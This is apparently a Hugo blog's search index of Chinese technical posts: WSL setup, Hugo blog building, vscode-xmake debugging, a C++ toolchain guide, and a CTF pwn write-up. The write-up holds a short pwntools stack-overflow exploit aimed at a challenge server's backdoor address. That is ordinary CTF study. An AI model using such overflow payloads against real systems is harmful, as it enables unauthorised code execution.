[{"content":"安装ArchWSL 直接从微软商店安装即可，没有使用ArchWSL项目\n或者\nwsl -d Arch 开启systemd服务 vim /etc/wsl.conf 写入\n[boot] systemd=true 全局开启镜像网络模式 目前微软官方更加推荐使用 镜像网络模式\n打开pwsh\ncd ~ code .wslconfig 写入\n[wsl2] networkingMode = mirrored 特定WSL使用镜像模式 目前似乎不行\n","permalink":"https://ycna07.github.io/en/posts/blog/wsl%E9%81%87%E5%88%B0%E7%9A%84%E5%85%A8%E9%83%A8%E9%97%AE%E9%A2%98/","summary":"\u003ch1 id=\"安装archwsl\"\u003e安装ArchWSL\u003c/h1\u003e\n\u003cp\u003e直接从微软商店安装即可，没有使用\u003ca href=\"https://github.com/yuk7/ArchWSL\"\u003eArchWSL项目\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e或者\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-pwsh\" data-lang=\"pwsh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewsl -d Arch\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"开启systemd服务\"\u003e开启systemd服务\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evim /etc/wsl.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e写入\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eboot\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e全局开启镜像网络模式\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e目前微软官方更加推荐使用 \u003ca href=\"https://learn.microsoft.com/zh-cn/windows/wsl/networking#mirrored-mode-networking\"\u003e镜像网络模式\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e打开pwsh\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-pwsh\" data-lang=\"pwsh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd ~\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecode .wslconfig\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e写入\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[wsl2]\nnetworkingMode = mirrored\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"特定wsl使用镜像模式\"\u003e特定WSL使用镜像模式\u003c/h2\u003e\n\u003cp\u003e目前似乎不行\u003c/p\u003e","title":"WSL遇到的全部问题"},{"content":"参考https://krislinzhao.github.io/docs/create-a-wesite-using-github-pages-and-hugo/#6-%E7%94%A8-hugo-%E5%88%9B%E5%BB%BA%E6%96%87%E7%AB%A0\nHugo创建新内容命令 hugo new content \u0026#34;D:\\Hugo\\blog\\content\\posts\\blog\\Hugo博客搭建回顾\\index.md\u0026#34; 安装Hugo scoop install hugo@0.112.4 使用的Hugo版本0.112.4，与papermod主题exmaplesite保持一致以防止出现构建错误\nscoop uninstall hugo scoop install hugo 安装最新版hugo\nHugo识别图片 因为各平台图片识别不一样，配置麻烦，最后使用picgo+SMMS图床实现加载图片\n配置文件 https://qing.shuncs.com/post/hugo/hugoupdate/ 显示最后更新时间与创建时间配置文件参考链接\nhttps://www.sulvblog.cn/posts/blog/build_hugo/https://github.com/adityatelange/hugo-PaperMod/添加侧边目录\nhttps://www.zhouxin.space/logs/introduce-side-toc-and-reading-percentage-to-papermod/\n修改字体 参考\n","permalink":"https://ycna07.github.io/en/posts/blog/hugo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%9B%9E%E9%A1%BE/","summary":"\u003cp\u003e参考https://krislinzhao.github.io/docs/create-a-wesite-using-github-pages-and-hugo/#6-%E7%94%A8-hugo-%E5%88%9B%E5%BB%BA%E6%96%87%E7%AB%A0\u003c/p\u003e","title":"Hugo博客搭建回顾"},{"content":"前言 Windows版本 ：10.0.27729\nxmake版本: 2.9.5\nxmake-vscode: 2.3.8\nxmake-vscode设置tooltrain为mingw，platform为Windows无法调试，设置为mingw即可\nvscode-xmake debugger.ts 源码片段\nif (os.platform() == \u0026#34;darwin\u0026#34;) { debugConfig = { name: `launch: ${targetName}`, type: \u0026#39;cppdbg\u0026#39;, request: \u0026#39;launch\u0026#39;, program: targetProgram, args: args, stopAtEntry: true, cwd: targetRunDir, environment: targetRunEnvs, externalConsole: false, MIMode: \u0026#34;lldb\u0026#34;, miDebuggerPath: \u0026#34;\u0026#34; }; } else if (os.platform() == \u0026#34;linux\u0026#34;) { debugConfig = { name: `launch: ${targetName}`, type: \u0026#39;cppdbg\u0026#39;, request: \u0026#39;launch\u0026#39;, program: targetProgram, args: args, stopAtEntry: true, cwd: targetRunDir, environment: targetRunEnvs, externalConsole: false, // @see https://github.com/xmake-io/xmake-vscode/issues/36 MIMode: \u0026#34;gdb\u0026#34;, miDebuggerPath: await this.findGdbPath(), setupCommands:[ { description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, text: \u0026#34;-enable-pretty-printing\u0026#34;, ignoreFailures: true } ] }; } else if (os.platform() == \u0026#34;win32\u0026#34; \u0026amp;\u0026amp; plat == \u0026#34;mingw\u0026#34;) { debugConfig = { name: `launch: ${targetName}`, type: \u0026#39;cppdbg\u0026#39;, request: \u0026#39;launch\u0026#39;, program: targetProgram, args: args, stopAtEntry: true, cwd: targetRunDir, environment: targetRunEnvs, externalConsole: false, MIMode: \u0026#34;gdb\u0026#34;, miDebuggerPath: await this.findGdbPath(), setupCommands:[ { description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, text: \u0026#34;-enable-pretty-printing\u0026#34;, ignoreFailures: true } ] // description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, // text: \u0026#34;-enable-pretty-printing\u0026#34;, // ignoreFailures: true }; } else if (os.platform() == \u0026#34;win32\u0026#34;) { debugConfig = { name: `launch: ${targetName}`, type: \u0026#39;cppvsdbg\u0026#39;, request: \u0026#39;launch\u0026#39;, program: targetProgram, args: args, stopAtEntry: true, cwd: targetRunDir, environment: targetRunEnvs, // externalConsole: true, // https://github.com/microsoft/vscode-cpptools/issues/6939 // externalTerminal only supports cmd when debugging. https://github.com/microsoft/vscode/issues/147120 console: \u0026#34;internalConsole\u0026#34;, MIMode: \u0026#34;gdb\u0026#34;, miDebuggerPath: \u0026#34;\u0026#34;, setupCommands:[ { description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, text: \u0026#34;-enable-pretty-printing\u0026#34;, ignoreFailures: true } ] // description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, // text: \u0026#34;-enable-pretty-printing\u0026#34;, // ignoreFailures: true }; 可以看到win32下plat=mingw时调用cppdbg否则调用cppvsdbg 所以plat设置为Windows时应该使用MSVC链接才能正确识别符号表\n","permalink":"https://ycna07.github.io/en/posts/blog/vscode-xmake%E8%B0%83%E8%AF%95%E8%B7%B3%E6%96%AD%E7%82%B9%E5%88%86%E6%9E%90/","summary":"\u003ch1 id=\"前言\"\u003e前言\u003c/h1\u003e\n\u003cp\u003e\u003ccode\u003eWindows版本\u003c/code\u003e ：10.0.27729\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003exmake版本\u003c/code\u003e: 2.9.5\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003exmake-vscode\u003c/code\u003e: 2.3.8\u003c/p\u003e\n\u003cp\u003exmake-vscode设置tooltrain为mingw，platform为Windows无法调试，设置为mingw即可\u003c/p\u003e","title":"Vscode Xmake调试跳断点分析"},{"content":"vscode：编辑器 xmake：基于 Lua 的轻量级跨平台构建工具 clangd：高性能，智能代码提示与补全 mingw：配置简单，生成的可执行文件体积小 cpptools：用于debug（可以使用codelldb代替）\n安装环节 安装好vscode以后，使用scoop安装xmake与clang,mingw\nscoop install xmake scoop install LLVM #直接安装LLVM即带有clang，也可以单独安装，这里是为了方便 scoop install mingw scoop会自动配置好环境变量，重新启动终端打开终端输入\nxmake --version clang -v gcc -v g++ -v 输出版本说明环境变量已经配置成功\n接下来打开vscode安装插件 xmake clangd C++extensionpack（或者Codelldb）\nvscode插件配置 clangd 打开vscode Clangd插件设置找到\u0026quot;clangd.arguments\u0026quot;\n\u0026#34;clangd.arguments\u0026#34;: [ \u0026#34;--background-index\u0026#34;, \u0026#34;-j=12\u0026#34;, \u0026#34;--clang-tidy\u0026#34;, \u0026#34;--all-scopes-completion\u0026#34;, \u0026#34;--completion-style=detailed\u0026#34;, \u0026#34;--header-insertion=iwyu\u0026#34;, \u0026#34;--pch-storage=disk\u0026#34;, \u0026#34;--compile-commands-dir=${workspaceFolder}/.vscode\u0026#34;, \u0026#34;-query-driver=\\\u0026#34;E:\\\\Apps\\\\MinGW\\\\mingw64\\\\bin\\\\g++.exe\\\u0026#34; \u0026#34; ] 以上参数含义自行百度进行设置即可 \u0026ndash;query-driver为电脑mingw的g++地址，不能直接复制\nC/C++ 以下设置是为了避免C/C++插件的代码提示干扰clangd\n打开vscode C/C++插件设置 搜索autocomplete设置为disable 搜索intelli，找到Intelli Sense Engine设置为disable\nCodelldb 如果你使用cpptools（C/C++ extension）调试可以跳过这部分\n搜索xmake:debug设置Debug Config Type 为codelldb\n实际运行 运行 mkdir Hello cd Hello code . 打开vscode以后新建hello.cpp\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;map\u0026gt; int main() { std::map\u0026lt;std::string, int\u0026gt; m; m[\u0026#34;Alice\u0026#34;] = 30; m[\u0026#34;Bob\u0026#34;] = 25; m.clear(); std::cout\u0026lt;\u0026lt;\u0026#34;Hello World\u0026#34;\u0026lt;\u0026lt;std::endl; } 然后在终端运行\nxmake 当前版本（v2.9.5）会提示 note: xmake.lua not found, try generating it (pass -y or \u0026ndash;confirm=y/n/d to skip confirm)?\n输入y后vscode的xmake拓展自动激活\n现在已经可以编译运行了（xmake会自动寻找到mingw，如果没有安装MSVC的话） 但是点击调试无法走到断点\n调试 接下来开始设置xmake.lua\ntarget(\u0026#34;hello\u0026#34;) set_kind(\u0026#34;binary\u0026#34;) add_files(\u0026#34;hello.cpp\u0026#34;) set_toolchains(\u0026#34;mingw\u0026#34;) set_languages(\u0026#34;c99\u0026#34;, \u0026#34;cxx14\u0026#34;) set_plat(\u0026#34;mingw\u0026#34;) add_rules(\u0026#34;mode.debug\u0026#34;, \u0026#34;mode.release\u0026#34;) 在底部设置mode为debug，paltform修改Windows为mingw\n点击小虫子即可调试，目前似乎无法绑定vscode的F5调试\nps：目前我拿来写算法，通常编译单一源文件，暂时没有测试交叉编译大型项目\n","permalink":"https://ycna07.github.io/en/posts/blog/vscode+xmake+clangd+mingw+cpptools%E9%85%8D%E7%BD%AEwindowsc++%E7%8E%AF%E5%A2%83/","summary":"\u003cp\u003evscode：编辑器\nxmake：基于 Lua 的轻量级跨平台构建工具\nclangd：高性能，智能代码提示与补全\nmingw：配置简单，生成的可执行文件体积小\ncpptools：用于debug（可以使用codelldb代替）\u003c/p\u003e","title":"2024年11月Vscode+xmake+clangd+mingw+cpptools配置windowsC++环境"},{"content":"PWN Week1 1.testyourpwntool 2.stackoverflow 00007ffdad8c5320 00007ffdad8c5358 38 backdoor：4012bd\nfrom pwn import * io = remote(\u0026#39;47.97.58.52\u0026#39;, 40001) payload=b\u0026#39;a\u0026#39;*0x38+p64(0x00000000004012BD) io.send(payload) io.send(b\u0026#39;a\u0026#39;*0x38+p64(0x00000000004012BD)) io.send(\u0026#39;\\n\u0026#39;) io.interactive() 5.whereismybinsh pop_rdi_ret:0x0000000000401323\n4.find_me\n尝试ioexp 查看libc.so.6版本\n","permalink":"https://ycna07.github.io/en/posts/writeups/0xgame2024/","summary":"\u003ch1 id=\"pwn\"\u003ePWN\u003c/h1\u003e\n\u003ch2 id=\"week1\"\u003eWeek1\u003c/h2\u003e\n\u003ch3 id=\"1testyourpwntool\"\u003e1.testyourpwntool\u003c/h3\u003e\n\u003ch3 id=\"2stackoverflow\"\u003e2.stackoverflow\u003c/h3\u003e\n\u003cp\u003e00007ffdad8c5320\n00007ffdad8c5358\n38\nbackdoor：4012bd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-Python\" data-lang=\"Python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e pwn \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e io \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e remote(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;47.97.58.52\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e40001\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e payload\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x38\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003ep64(\u003cspan style=\"color:#ae81ff\"\u003e0x00000000004012BD\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e io\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(payload)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e io\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x38\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003ep64(\u003cspan style=\"color:#ae81ff\"\u003e0x00000000004012BD\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e io\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e io\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einteractive()\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20241006202956597.png\" alt=\"addr of system\"  /\u003e\n\u003c/p\u003e\n\u003ch3 id=\"5whereismybinsh\"\u003e5.whereismybinsh\u003c/h3\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20241008115415709.png\" alt=\"gadget\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003epop_rdi_ret:0x0000000000401323\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20241008120813482.png\" alt=\"code\u0026amp;flag\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e4.find_me\u003c/p\u003e\n\u003cp\u003e尝试ioexp\n查看libc.so.6版本\u003c/p\u003e","title":"0xGame2024 Pwn\u0026Rev"},{"content":"","permalink":"https://ycna07.github.io/en/links/","summary":"","title":""}]